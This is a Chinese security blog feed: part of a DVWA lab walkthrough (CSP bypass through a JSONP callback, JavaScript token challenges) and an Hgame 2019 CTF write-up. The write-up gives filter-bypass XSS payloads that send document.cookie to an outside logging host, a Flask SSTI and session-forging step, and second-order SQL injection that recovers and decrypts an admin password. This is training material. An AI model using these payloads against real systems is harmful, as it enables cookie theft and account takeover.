&#123;</span><br><span class="line">$callback = $_GET[<span class="string">&#x27;callback&#x27;</span>];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$outp = <span class="keyword">array</span> (<span class="string">&quot;answer&quot;</span> =&gt; <span class="string">&quot;15&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> $callback . <span class="string">&quot;(&quot;</span>.json_encode($outp).<span class="string">&quot;)&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>发现<code>$callback</code>可控，而且直接拼接输出。回头一看，原页面中<code>include</code>也是可控的，而且是直接拼接到HTML body中输出的。但是因为有CSP，不可以直接无脑的去打payload</p><p><img src="https://i.loli.net/2020/03/03/Nndsi53TPAmjGwL.png"></p><p>联系<code>jsonp.php的$callback</code>，且符合CSP的同源规则，可以这样利用：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">include&#x3D;&lt;script src&#x3D;&quot;source&#x2F;jsonp.php?callback&#x3D;alert(&#39;XSS&#39;);&quot;&gt;&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><p>这样由include去调用<code>jsonp.php</code>，而<code>jsonp.php</code>中的参数可控且直接拼接，<code>json.php</code>,没有用CSP规则，这样就绕开了CSP完成了XSS攻击。</p><h2 id="Impossible-11"><a href="#Impossible-11" class="headerlink" title="Impossible"></a>Impossible</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">&quot;Content-Type: application/json; charset=UTF-8&quot;</span>);</span><br><span class="line"></span><br><span class="line">$outp = <span class="keyword">array</span> (<span class="string">&quot;answer&quot;</span> =&gt; <span class="string">&quot;15&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;solveSum (&quot;</span>.json_encode($outp).<span class="string">&quot;)&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>jsonp_impossible.php</code>修复了<code>call_back</code>可控的问题。</p><h1 id="JavaScript"><a href="#JavaScript" class="headerlink" title="JavaScript"></a>JavaScript</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$page[ <span class="string">&#x27;body&#x27;</span> ] .= <span class="string">&lt;&lt;&lt;EOF</span></span><br><span class="line"><span class="string">&lt;script&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/*</span></span><br><span class="line"><span class="string">MD5 code from here</span></span><br><span class="line"><span class="string">https://github.com/blueimp/JavaScript-MD5</span></span><br><span class="line"><span class="string">*/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">!function(n)&#123;&quot;use strict&quot;;function t(n,t)&#123;var r=(65535&amp;n)+(65535&amp;t);return(n&gt;&gt;16)+(t&gt;&gt;16)+(r&gt;&gt;16)&lt;&lt;16|65535&amp;r&#125;function r(n,t)&#123;return n&lt;&lt;t|n&gt;&gt;&gt;32-t&#125;function e(n,e,o,u,c,f)&#123;return t(r(t(t(e,n),t(u,f)),c),o)&#125;function o(n,t,r,o,u,c,f)&#123;return e(t&amp;r|~t&amp;o,n,t,u,c,f)&#125;function u(n,t,r,o,u,c,f)&#123;return e(t&amp;o|r&amp;~o,n,t,u,c,f)&#125;function c(n,t,r,o,u,c,f)&#123;return e(t^r^o,n,t,u,c,f)&#125;function f(n,t,r,o,u,c,f)&#123;return e(r^(t|~o),n,t,u,c,f)&#125;function i(n,r)&#123;n[r&gt;&gt;5]|=128&lt;&lt;r%32,n[14+(r+64&gt;&gt;&gt;9&lt;&lt;4)]=r;var e,i,a,d,h,l=1732584193,g=-271733879,v=-1732584194,m=271733878;for(e=0;e&lt;n.length;e+=16)i=l,a=g,d=v,h=m,g=f(g=f(g=f(g=f(g=c(g=c(g=c(g=c(g=u(g=u(g=u(g=u(g=o(g=o(g=o(g=o(g,v=o(v,m=o(m,l=o(l,g,v,m,n[e],7,-680876936),g,v,n[e+1],12,-389564586),l,g,n[e+2],17,606105819),m,l,n[e+3],22,-1044525330),v=o(v,m=o(m,l=o(l,g,v,m,n[e+4],7,-176418897),g,v,n[e+5],12,1200080426),l,g,n[e+6],17,-1473231341),m,l,n[e+7],22,-45705983),v=o(v,m=o(m,l=o(l,g,v,m,n[e+8],7,1770035416),g,v,n[e+9],12,-1958414417),l,g,n[e+10],17,-42063),m,l,n[e+11],22,-1990404162),v=o(v,m=o(m,l=o(l,g,v,m,n[e+12],7,1804603682),g,v,n[e+13],12,-40341101),l,g,n[e+14],17,-1502002290),m,l,n[e+15],22,1236535329),v=u(v,m=u(m,l=u(l,g,v,m,n[e+1],5,-165796510),g,v,n[e+6],9,-1069501632),l,g,n[e+11],14,643717713),m,l,n[e],20,-373897302),v=u(v,m=u(m,l=u(l,g,v,m,n[e+5],5,-701558691),g,v,n[e+10],9,38016083),l,g,n[e+15],14,-660478335),m,l,n[e+4],20,-405537848),v=u(v,m=u(m,l=u(l,g,v,m,n[e+9],5,568446438),g,v,n[e+14],9,-1019803690),l,g,n[e+3],14,-187363961),m,l,n[e+8],20,1163531501),v=u(v,m=u(m,l=u(l,g,v,m,n[e+13],5,-1444681467),g,v,n[e+2],9,-51403784),l,g,n[e+7],14,1735328473),m,l,n[e+12],20,-1926607734),v=c(v,m=c(m,l=c(l,g,v,m,n[e+5],4,-378558),g,v,n[e+8],11,-2022574463),l,g,n[e+11],16,1839030562),m,l,n[e+14],23,-35309556),v=c(v,m=c(m,l=c(l,g,v,m,n[e+1],4,-1530992060),g,v,n[e+4],11,1272893353),l,g,n[e+7],16,-155497632),m,l,n[e+10],23,-1094730640),v=c(v,m=c(m,l=c(l,g,v,m,n[e+13],4,681279174),g,v,n[e],11,-358537222),l,g,n[e+3],16,-722521979),m,l,n[e+6],23,76029189),v=c(v,m=c(m,l=c(l,g,v,m,n[e+9],4,-640364487),g,v,n[e+12],11,-421815835),l,g,n[e+15],16,530742520),m,l,n[e+2],23,-995338651),v=f(v,m=f(m,l=f(l,g,v,m,n[e],6,-198630844),g,v,n[e+7],10,1126891415),l,g,n[e+14],15,-1416354905),m,l,n[e+5],21,-57434055),v=f(v,m=f(m,l=f(l,g,v,m,n[e+12],6,1700485571),g,v,n[e+3],10,-1894986606),l,g,n[e+10],15,-1051523),m,l,n[e+1],21,-2054922799),v=f(v,m=f(m,l=f(l,g,v,m,n[e+8],6,1873313359),g,v,n[e+15],10,-30611744),l,g,n[e+6],15,-1560198380),m,l,n[e+13],21,1309151649),v=f(v,m=f(m,l=f(l,g,v,m,n[e+4],6,-145523070),g,v,n[e+11],10,-1120210379),l,g,n[e+2],15,718787259),m,l,n[e+9],21,-343485551),l=t(l,i),g=t(g,a),v=t(v,d),m=t(m,h);return[l,g,v,m]&#125;function a(n)&#123;var t,r=&quot;&quot;,e=32*n.length;for(t=0;t&lt;e;t+=8)r+=String.fromCharCode(n[t&gt;&gt;5]&gt;&gt;&gt;t%32&amp;255);return r&#125;function d(n)&#123;var t,r=[];for(r[(n.length&gt;&gt;2)-1]=void 0,t=0;t&lt;r.length;t+=1)r[t]=0;var e=8*n.length;for(t=0;t&lt;e;t+=8)r[t&gt;&gt;5]|=(255&amp;n.charCodeAt(t/8))&lt;&lt;t%32;return r&#125;function h(n)&#123;return a(i(d(n),8*n.length))&#125;function l(n,t)&#123;var r,e,o=d(n),u=[],c=[];for(u[15]=c[15]=void 0,o.length&gt;16&amp;&amp;(o=i(o,8*n.length)),r=0;r&lt;16;r+=1)u[r]=909522486^o[r],c[r]=1549556828^o[r];return e=i(u.concat(d(t)),512+8*t.length),a(i(c.concat(e),640))&#125;function g(n)&#123;var t,r,e=&quot;&quot;;for(r=0;r&lt;n.length;r+=1)t=n.charCodeAt(r),e+=&quot;0123456789abcdef&quot;.charAt(t&gt;&gt;&gt;4&amp;15)+&quot;0123456789abcdef&quot;.charAt(15&amp;t);return e&#125;function v(n)&#123;return unescape(encodeURIComponent(n))&#125;function m(n)&#123;return h(v(n))&#125;function p(n)&#123;return g(m(n))&#125;function s(n,t)&#123;return l(v(n),v(t))&#125;function C(n,t)&#123;return g(s(n,t))&#125;function A(n,t,r)&#123;return t?r?s(t,n):C(t,n):r?m(n):p(n)&#125;&quot;function&quot;==typeof define&amp;&amp;define.amd?define(function()&#123;return A&#125;):&quot;object&quot;==typeof module&amp;&amp;module.exports?module.exports=A:n.md5=A&#125;(this);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    function rot13(inp) &#123;</span></span><br><span class="line"><span class="string">        return inp.replace(/[a-zA-Z]/g,function(c)&#123;return String.fromCharCode((c&lt;=&quot;Z&quot;?90:122)&gt;=(c=c.charCodeAt(0)+13)?c:c-26);&#125;);</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    function generate_token() &#123;</span></span><br><span class="line"><span class="string">        var phrase = document.getElementById(&quot;phrase&quot;).value;</span></span><br><span class="line"><span class="string">        document.getElementById(&quot;token&quot;).value = md5(rot13(phrase));</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    generate_token();</span></span><br><span class="line"><span class="string">&lt;/script&gt;</span></span><br><span class="line"><span class="string">EOF;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>generate_token()</code>函数设置了一个<code>token=md5(rot13($phrase))</code></p><p>有因为<code>phrase=&#39;success&#39;</code>,所以带上这个<code>token</code>应该就对了。</p><p>因为这个函数是前台的，我们直接用<code>console</code>，修改运行一下，就能得到<code>token</code></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function generate_token() &#123;</span><br><span class="line">        var phrase &#x3D; &#39;success&#39;;</span><br><span class="line">        alert(md5(rot13(phrase)));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/03/03/317F6r54cNS9pQx.png"></p><h2 id="Medium-13"><a href="#Medium-13" class="headerlink" title="Medium"></a>Medium</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$page[ <span class="string">&#x27;body&#x27;</span> ] .= <span class="string">&lt;&lt;&lt;EOF</span></span><br><span class="line"><span class="string">&lt;script src=&quot;/vulnerabilities/javascript/source/medium.js&quot;&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="string">EOF;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>采用引用的外部js的方式</p><p><code>setTimeout</code>是一个计时器，300毫秒就执行一次<code>do_elsesomething(&quot;XX&quot;)</code>，而<code>token</code>就在这个函数设置。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">do_something</span>(<span class="params">e</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> t = <span class="string">&quot;&quot;</span>, n = e.length - <span class="number">1</span>; n &gt;= <span class="number">0</span>; n--) t += e[n];</span><br><span class="line">    <span class="keyword">return</span> t</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    do_elsesomething(<span class="string">&quot;XX&quot;</span>)</span><br><span class="line">&#125;, <span class="number">300</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">do_elsesomething</span>(<span class="params">e</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">document</span>.getElementById(<span class="string">&quot;token&quot;</span>).value = do_something(e + <span class="built_in">document</span>.getElementById(<span class="string">&quot;phrase&quot;</span>).value + <span class="string">&quot;XX&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="High-12"><a href="#High-12" class="headerlink" title="High"></a>High</h2><p>高级和中级类似，生成 token 的逻辑在额外的 js 文件中。和中级不同的是，这里的 JS 经过了混淆的。。。就显得很混乱。</p><p>推荐一个网站<a href="http://deobfuscatejavascript.com/#">http://deobfuscatejavascript.com/#</a></p><p>用来解js的混淆，挺好用的，或者直接看未混淆版的（<code>dvwa\vulnerabilities\javascript\source\high_unobfuscated.js</code>）</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">do_something</span>(<span class="params">e</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> t = <span class="string">&quot;&quot;</span>, n = e.length - <span class="number">1</span>; n &gt;= <span class="number">0</span>; n--) t += e[n];</span><br><span class="line">    <span class="keyword">return</span> t</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">token_part_3</span>(<span class="params">t, y = <span class="string">&quot;ZZ&quot;</span></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">document</span>.getElementById(<span class="string">&quot;token&quot;</span>).value = sha256(<span class="built_in">document</span>.getElementById(<span class="string">&quot;token&quot;</span>).value + y)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">token_part_2</span>(<span class="params">e = <span class="string">&quot;YY&quot;</span></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">document</span>.getElementById(<span class="string">&quot;token&quot;</span>).value = sha256(e + <span class="built_in">document</span>.getElementById(<span class="string">&quot;token&quot;</span>).value)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">token_part_1</span>(<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">document</span>.getElementById(<span class="string">&quot;token&quot;</span>).value = do_something(<span class="built_in">document</span>.getElementById(<span class="string">&quot;phrase&quot;</span>).value)</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">&quot;phrase&quot;</span>).value = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    token_part_2(<span class="string">&quot;XX&quot;</span>)</span><br><span class="line">&#125;, <span class="number">300</span>);</span><br><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">&quot;send&quot;</span>).addEventListener(<span class="string">&quot;click&quot;</span>, token_part_3);</span><br><span class="line">token_part_1(<span class="string">&quot;ABCD&quot;</span>, <span class="number">44</span>);</span><br></pre></td></tr></table></figure><p>这里生成 token 的步骤是：</p><p>1、执行<code>token_part_1(&quot;ABCD&quot;, 44)</code><br>2、执行<code>token_part_2(&quot;XX&quot;)</code>(原本是延迟 300ms执行的那个）<br>3、点击按钮的时候执行 <code>token_part_3</code></p><p>所以我们在输入框输入 success 后，再到控制台中输入<code>token_part_1(&quot;ABCD&quot;, 44)</code>和<code>token_part_2(&quot;XX&quot;)</code>这两个函数就可以了。</p><p>我这里没加载出js,我直接整个代码放到console执行，也是可以的，但是注意改一下执行顺序：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">token_part_1(<span class="string">&quot;ABCD&quot;</span>, <span class="number">44</span>);</span><br><span class="line"><span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;token_part_2(<span class="string">&quot;XX&quot;</span>)&#125;,<span class="number">300</span>);</span><br><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">&quot;phrase&quot;</span>).value=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">&quot;send&quot;</span>).addEventListener(<span class="string">&quot;click&quot;</span>, token_part_3); </span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/03/03/c4sHdulIvqW15PQ.png"></p><h2 id="Impossible-12"><a href="#Impossible-12" class="headerlink" title="Impossible"></a>Impossible</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">You can never trust anything that comes from the user or prevent them from messing with it and so there is no impossible level.</span><br></pre></td></tr></table></figure><p>哈哈哈哈哈哈。</p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol><li><a href="https://www.freebuf.com/author/lonehand">新手指南：DVWA-1.9全级别教程</a>，安全客，lonehand</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;考研大半年没碰安全方面，考完研，想重新拾起网络安全方面的知识，想起来重新复现一遍DVWA，新的一年，希望能温故知新。另一方面，新版的&lt;cod</summary>
      
    
    
    
    <category term="靶场练习" scheme="v0w.top/categories/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/"/>
    
    
    <category term="RCE" scheme="v0w.top/tags/RCE/"/>
    
    <category term="XSS" scheme="v0w.top/tags/XSS/"/>
    
    <category term="SQL注入" scheme="v0w.top/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
    <category term="文件上传" scheme="v0w.top/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
    <category term="文件包含" scheme="v0w.top/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    
    <category term="CSRF" scheme="v0w.top/tags/CSRF/"/>
    
  </entry>
  
  <entry>
    <title>杭电Hgame2019-week4-WP</title>
    <link href="v0w.top/2019/02/23/Hgame2019-week4/"/>
    <id>v0w.top/2019/02/23/Hgame2019-week4/</id>
    <published>2019-02-22T16:00:00.000Z</published>
    <updated>2020-07-18T10:41:50.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="HappyXSS"><a href="#HappyXSS" class="headerlink" title="HappyXSS"></a>HappyXSS</h2><blockquote><p>Description<br>同上周，但是增加了一点点难度。<br>URL <a href="http://118.25.18.223:7000/index.php">http://118.25.18.223:7000/index.php</a></p></blockquote><p>测试发现会将<code>&lt;/script&gt;</code>替换成<code>Happy!</code>。</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">                    substr(md5($_POST[&quot;code&quot;]),0,4)===7ece<span class="tag">&lt;<span class="name">br</span>&gt;</span> Happy! alert(xss&#x27;) Happy!                 <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>继续测试发现过滤的字符有：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;&#x2F;script&gt;svgimgdocumentcookie</span><br><span class="line">&quot;&amp;#</span><br></pre></td></tr></table></figure><p>找到一个payload，但是直接用肯定不行，加上img元素又会碰到其他的敏感字导致替换：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;select autofocus onfocus&#x3D;alert(1)&gt;</span><br></pre></td></tr></table></figure><hr><p>看了一叶飘零的WP，了解到可以通过<strong>ascii码拼接的方式bypass</strong>，自己XSS这块掌握的还是不熟==、</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;input onfocus&#x3D;javascript:eval(String.fromCharCode(119,105,110,100,111,119,46,108,111,99,97,116,105,111,110,46,104,114,101,102,61,34,104,116,116,112,58,47,47,49,50,55,46,48,46,48,46,49,58,50,53,48,48,48,47,63,115,61,34,43,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,59)); autofocus&gt;</span><br></pre></td></tr></table></figure><p>我还注意到另一位大佬，用字符串拼接的方式，因为<code>&quot;&quot;</code>被过滤了，采用<code>&#39;&#39;</code>或者反引号来拼接</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;iframe src&#x3D;&#39;javascript:var a &#x3D; &#96;btoa(documen&#96; + &#96;t&#96;+&#96;.cooki&#96;+&#96;e)&#96;;</span><br><span class="line">var b&#x3D;decodeURIComponent(&#96;%2f&#96;);</span><br><span class="line">var url &#x3D;&#96;http:&#96; + b + b  + &#96;xss.wuhan5.cc&#96; + b + &#96;?cooki&#96;+&#96;e&#x3D;&#96; +eval(a);</span><br><span class="line">var d &#x3D; &#96;&lt;li&#96; + &#96;nk type&#x3D;text&#x2F;css rel&#x3D;styleSheet hr&#96;+ &#96;ef&#x3D;&#96; + url +&#96; &#x2F;&gt;&#96;;</span><br><span class="line">var e &#x3D; &#96;docu&#96; + &#96;ment.write(\&#96;&#96; + d + &#96;\&#96;)&#96;;</span><br><span class="line">eval(e);</span><br><span class="line">&#39;&gt;&lt;&#x2F;iframe&gt;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/02/26/5c748fc3868c7.png"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PHPSESSID&#x3D;5vbcci1j0uq760ucltd181pof5; Flag&#x3D;hgame&#123;Xss_1s_Re@llY_Haaaaaappy!!!&#125;</span><br></pre></td></tr></table></figure><h2 id="happyPython"><a href="#happyPython" class="headerlink" title="happyPython"></a>happyPython</h2><blockquote><p>Description<br>flag 在管理员账号下<br>URL <a href="http://118.25.18.223:3001/">http://118.25.18.223:3001</a></p></blockquote><p>flask开发，容易发现SSTI</p><p><img src="https://i.loli.net/2019/02/22/5c6fa1705befa.png"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;118.25.18.223:3001&#x2F;&#123;&#123; url_for.__globals__ [&#39;current_app&#39;].config&#125;&#125;</span><br></pre></td></tr></table></figure><p>拿到<code>SECRET_KEY</code></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;SECRET_KEY&#39;: &#39;9RxdzNwq7!nOoK3*&#39;</span><br></pre></td></tr></table></figure><p>然后解密得到：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;flask-session-cookie-manager-master# python session_cookie_manager.py decode -s &#39;9RxdzNwq7!nOoK3*&#39; -c &#39;.eJwlj0FqQzEMBe_idRayJctWLvORZImGQAv_J6vSu8fQ3Wze8Oa3HHnG9VXur_Mdt3I8VrkXqJ1Z3EdSj2rDKkQfTZvX0WWQDZ2q2AjTOxMZ4oqwFTWNQgZ41R7MxoqeklJNnBDFpjRqDADe04cjG4iu6cAqXbc2sucst-LXmcfr5xnf-89E07WoYQ1wDt6wVQwj15xI3mSmrqC9e19x_kfU8vcBud0_WA.XG-00g.qGnRtXgk-258_eRyCypBxUeLDoM&#39;</span><br><span class="line">&#123;u&#39;csrf_token&#39;: u&#39;83badd4231e0c6e62319b8607fd8834c298fade4&#39;, u&#39;_fresh&#39;: True, u&#39;user_id&#39;: u&#39;1&#39;, u&#39;_id&#39;: u&#39;015669cc7f45e1b7b10e572a2c175974b7a8aa3243fc5644b33deebde1fb4e970c1a5e66b6a3cf9f91b9c4339b892426000c5fc7c36b09ad8c06a95a7a8ef5f8&#39;&#125;</span><br></pre></td></tr></table></figure><p>将user改成<code>admin</code>，因为解密的数据只有一个id能算成admin，将<code>id</code>改成1。然后可以通过<a href="https://github.com/noraj/flask-session-cookie-manager">flask-session-cookie-manager</a>，伪造session</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;flask-session-cookie-manager-master# python session_cookie_manager.py encode -s &#39;9RxdzNwq7!nOoK3*&#39; -t &quot;&#123;u&#39;csrf_token&#39;: u&#39;83badd4231e0c6e62319b8607fd8834c298fade4&#39;, u&#39;_fresh&#39;: True, u&#39;user_id&#39;: u&#39;1&#39;, u&#39;_id&#39;: u&#39;015669cc7f45e1b7b10e572a2c175974b7a8aa3243fc5644b33deebde1fb4e970c1a5e66b6a3cf9f91b9c4339b892426000c5fc7c36b09ad8c06a95a7a8ef5f8&#39;&#125;&quot;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/02/22/5c6fbb67e5c6b.png"></p><h2 id="happyPHP"><a href="#happyPHP" class="headerlink" title="happyPHP"></a>happyPHP</h2><blockquote><p>Description<br>flag 在管理员账号下<br>URL <a href="http://118.25.18.223:3000/">http://118.25.18.223:3000/</a></p></blockquote><p>发现源代码</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!--https:&#x2F;&#x2F;github.com&#x2F;Lou00&#x2F;laravel--&gt;</span><br></pre></td></tr></table></figure><hr><p>2.25学习一波大佬的WP：</p><p>下载源码之后，直接搜索flag看看，发现<code>\app\Http\Controllers\SessionsController.php</code>，<code>id=1</code>时，出现flag</p><p><img src="https://i.loli.net/2019/02/26/5c7494fad5a30.png"></p><p>同时发现SQL操作：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$name = DB::select(<span class="string">&quot;SELECT name FROM `users` WHERE `name`=&#x27;&quot;</span>.Auth::user()-&gt;name.<span class="string">&quot;&#x27;&quot;</span>);</span><br><span class="line">            session()-&gt;flash(<span class="string">&#x27;info&#x27;</span>, <span class="string">&#x27;hello &#x27;</span>.$name[<span class="number">0</span>]-&gt;name);</span><br><span class="line">            <span class="keyword">return</span> redirect()-&gt;route(<span class="string">&#x27;users.show&#x27;</span>);</span><br></pre></td></tr></table></figure><p>这里的<code>name</code>就是我们的用户名，在注册的时候是可控的，并且也没有做任何过滤，注册后登陆造成二次注入，因此可以注出管理员的 E-Mail 和密码：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39; UNION SELECT email FROM &#96;users&#96; WHERE &#96;id&#96; &#x3D; 1#</span><br></pre></td></tr></table></figure><p>登录后可以获得管理员的 E-Mail：<code>admin@hgame.com</code></p><p>同样的方法拿到管理员的密码：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39; UNION SELECT password FROM &#96;users&#96; WHERE &#96;id&#96; &#x3D; 1#</span><br></pre></td></tr></table></figure><p>可以看到是 base64 编码后的：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">eyJpdiI6InJuVnJxZkN2ZkpnbnZTVGk5ejdLTHc9PSIsInZhbHVlIjoiRWFSXC80ZmxkT0dQMUdcL2FESzhlOHUxQWxkbXhsK3lCM3Mra0JBYW9Qb2RzPSIsIm1hYyI6IjU2ZTJiMzNlY2QyODI4ZmU2ZjQxN2M3ZTk4ZTlhNTg4YzA5N2YwODM0OTllMGNjNzIzN2JjMjc3NDFlODI5YWYifQ&#x3D;&#x3D;</span><br></pre></td></tr></table></figure><p>解码得到：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;iv&quot;:&quot;rnVrqfCvfJgnvSTi9z7KLw&#x3D;&#x3D;&quot;,&quot;value&quot;:&quot;EaR\&#x2F;4fldOGP1G\&#x2F;aDK8e8u1Aldmxl+yB3s+kBAaoPods&#x3D;&quot;,&quot;mac&quot;:&quot;56e2b33ecd2828fe6f417c7e98e9a588c097f083499e0cc7237bc27741e829af&quot;&#125;</span><br></pre></td></tr></table></figure><p>发现密码是加密的，与<code>\app\Http\Controllers\UsersController.php</code>代码一致：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$user = User::create([</span><br><span class="line">            <span class="string">&#x27;name&#x27;</span> =&gt; $request-&gt;name,</span><br><span class="line">            <span class="string">&#x27;email&#x27;</span> =&gt; $request-&gt;email,</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span> =&gt; encrypt($request-&gt;password),</span><br><span class="line">        ]);</span><br></pre></td></tr></table></figure><p>接下来找解密方式：<a href="http://www.mamicode.com/info-detail-2152904.html">laravel cookie加密解密原理</a></p><p>Laravel主要是使用openssl_encrypt加密</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">openssl_decrypt($encrypt, &#39;AES-256-CBC&#39;, $key, 0, $iv);</span><br></pre></td></tr></table></figure><p>这里的<code>$encrypt</code>使我们需要解密的内容，即上述 JSON 中的<code>value</code>；</p><p>``$iv<code>就是上述 JSON 中的</code>iv`了。</p><p>现在只差一个<code>key</code>了,Laravel的<code>$key</code>是指<code>env的APP_KEY</code></p><p>在github上的这个项目有3次<code>commit</code>，其中一次删除的<code>env</code>文件中有，这一点易被忽略：</p><p><img src="https://i.loli.net/2019/02/26/5c7499bf99117.png"></p><p>于是可以进行解密：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$value = <span class="string">&#x27;EaR\/4fldOGP1G\/aDK8e8u1Aldmxl+yB3s+kBAaoPods=&#x27;</span>;</span><br><span class="line">$key = base64_decode(<span class="string">&#x27;9JiyApvLIBndWT69FUBJ8EQz6xXl5vBs7ofRDm9rogQ=&#x27;</span>);</span><br><span class="line"></span><br><span class="line">$iv = base64_decode(<span class="string">&#x27;rnVrqfCvfJgnvSTi9z7KLw==&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> openssl_decrypt($value, <span class="string">&#x27;AES-256-CBC&#x27;</span>, $key, <span class="number">0</span>, $iv);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>发现得到序列化字符串：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">s:16:&quot;9pqfPIer0Ir9UUfR&quot;;</span><br></pre></td></tr></table></figure><p>即得到密码<code>9pqfPIer0Ir9UUfR</code></p><p>管理员的账户密码都得到了，登陆即可见flag</p><p><img src="https://i.loli.net/2019/02/26/5c749bdc9681d.png"></p>]]></content>
    
    
      
      
